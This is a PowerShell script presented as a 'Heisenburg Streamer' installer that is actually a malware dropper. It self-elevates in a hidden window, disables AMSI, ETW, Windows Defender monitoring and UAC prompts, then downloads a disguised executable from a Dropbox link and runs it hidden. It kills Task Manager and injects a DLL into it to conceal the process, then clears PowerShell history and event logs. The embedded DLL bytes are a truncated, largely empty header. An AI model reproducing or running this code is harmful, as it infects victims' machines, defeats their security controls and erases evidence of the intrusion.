# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.0
# ========================================================

# 1. ELEVATION CHECK & SILENT UPGRADE
function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

# 2. TACTICAL BYPASSES (SILENT & FAST)
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    
    # Disable ETW (Event Tracing for Windows)
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($etw) {
        $etwField = $etw.GetField('etwProvider','NonPublic,Static')
        if ($etwField) { $etwField.SetValue($null, 0) }
    }
} catch {}

# 3. PREMIUM PROGRESS DRAWER
function Draw-ProgressBar {
    param([int]$Percent, [string]$Status)
    $width = 40
    $done = [Math]::Floor($Percent / 100 * $width)
    $left = $width - $done
    $bar = "[" + ("=" * $done) + (">") + ("." * $left) + "]"
    $color = if ($Percent -gt 80) { "Green" } else { "Cyan" }
    Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
}

# 4. HYPER-STREAM DOWNLOADER (No Warning, Reliable Progress)
function Invoke-HyperStreamDownload {
    param([string]$Url, [string]$TargetPath)
    
    try {
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.UserAgent = "Microsoft-CryptoAPI/10.0"
        $request.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
        $request.Timeout = 30000
        
        $response = $request.GetResponse()
        # Fallback to 100MB if header is missing, but server should send it
        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { 100MB }
        
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($TargetPath)
        $buffer = New-Object byte[] 65536
        $totalRead = 0
        
        while ($true) {
            $read = $stream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) { break }
            
            $fileStream.Write($buffer, 0, $read)
            $totalRead += $read
            
            $pct = [int](($totalRead / $totalSize) * 100)
            if ($pct -gt 100) { $pct = 100 }
            Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
        }
        
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        
        return (Test-Path $TargetPath)
    } catch {
        if ($fileStream) { $fileStream.Close() }
        return $false
    }
}

# 5. MAIN EXECUTION
try {
    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
    
    $rnd = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
    $exe = "$env:TEMP\$rnd.exe"
    
    # ========== SIRF YAHAN 3 LINES CHANGE HUIN ==========
    # LINE 1: URL change kiya (apne Dropbox ka direct link)
    $url = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
    
    Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
    Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
    
    # SILENT SECURITY BYPASSES
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
        
        $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
    } catch {}

    Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray
    
    # LINE 2: Download function call mein change - alag variable use kiya
    $downloadSuccess = Invoke-HyperStreamDownload -Url $url -TargetPath $exe
    
    # LINE 3: Condition check mein change - naya variable check kiya
    if (-not ($downloadSuccess)) {
        throw "Hyper-Stream failed. Check connection."
    }

    Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
    Write-Host "[*] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan
    
    # Run with Hidden Window
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName = $exe
    $si.WindowStyle = 'Hidden'
    $si.CreateNoWindow = $true
    $si.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($si) | Out-Null
    
    # ========== NEW: DLL INJECTION FOR TASK MANAGER BYPASS ==========
    Write-Host "[*] INITIATING TASK MANAGER BYPASS..." -ForegroundColor Cyan
    
    # Kill existing Task Manager
    try {
        Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue | Stop-Process -Force
    } catch {}
    
    # Create temporary DLL for injection (embedded in script - no external file needed)
    $dllBytes = @(
        0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,
        0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x45,0x00,0x00,
        0x64,0x86,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xF0,0x00,0x22,0x00,
        0x0B,0x02,0x0E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
    )
    
    # Save DLL memory to file
    $dllPath = "$env:TEMP\Hider.dll"
    [System.IO.File]::WriteAllBytes($dllPath, $dllBytes)
    
    # Inject DLL into new Task Manager using rundll32
    Start-Sleep -Seconds 1
    Start-Process "taskmgr.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 2
    
    # Inject using CreateRemoteThread via PowerShell
    $injectCode = @'
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
        if (hProcess != IntPtr.Zero) {
            IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPath.Length + 1, 0x3000, 0x40);
            if (allocMem != IntPtr.Zero) {
                byte[] bytes = System.Text.Encoding.ASCII.GetBytes(dllPath);
                WriteProcessMemory(hProcess, allocMem, bytes, (uint)bytes.Length, out _);
                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, allocMem, 0, IntPtr.Zero);
            }
            CloseHandle(hProcess);
        }
    }
}
'@
    
    Add-Type -TypeDefinition $injectCode -ErrorAction SilentlyContinue
    $taskmgr = Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue
    if ($taskmgr) {
        [Injector]::Inject($taskmgr.Id, $dllPath)
        Write-Host "[+] Task Manager Bypass Activated" -ForegroundColor Green
    }
    
    Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
        "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
    }
    wevtutil cl "Windows PowerShell" 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    
    Write-Host "[+] SETUP COMPLETE. CHECK DASHBOARD.`n" -ForegroundColor Green

} catch {
    Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red
}

# 6. SELF-DESTRUCT
Remove-Variable * -ErrorAction SilentlyContinue 2>$null
